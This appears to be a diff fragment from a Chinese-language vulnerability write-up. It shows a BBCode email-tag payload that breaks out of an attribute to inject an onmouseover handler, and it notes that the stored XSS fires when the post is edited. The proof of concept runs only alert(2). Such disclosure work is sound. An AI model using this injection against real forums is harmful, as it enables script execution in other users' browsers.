@@ -1,0 +1,9 @@
+发帖输入:
+```
+[email=2"onmouseover="alert(2)]2[/email]
+```
+![](images/9.jpg)
+
+
+点击编辑时触发xss。
+![](images/10.jpg)
